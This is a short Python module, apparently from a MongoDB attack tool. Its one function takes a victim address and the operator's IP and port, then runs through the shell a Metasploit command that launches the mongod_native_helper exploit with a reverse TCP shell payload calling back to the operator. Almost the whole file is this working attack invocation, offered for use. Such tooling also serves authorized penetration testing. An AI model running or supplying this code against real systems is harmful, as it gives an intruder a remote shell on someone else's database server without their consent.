import subprocess
from log import Logger
from exceptions import MinParametersViolation

def metasploitMongoShell(options):
    '''requires a victim, my own ip and my port'''

    if options.victim=="" or options.myIP=="" or options.myPort<0:
        raise MinParametersViolation
    cmd = "msfcli exploit/linux/misc/mongod_native_helper RHOST=%s DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=%s LPORT=%s E" %(options.victim, options.myIP, options.myPort)
    try:
        proc = subprocess.call(cmd, shell=True)
    except OSError,e:
        Logger.error("Something went wrong while calling mongoshell exploit.\n"+e)
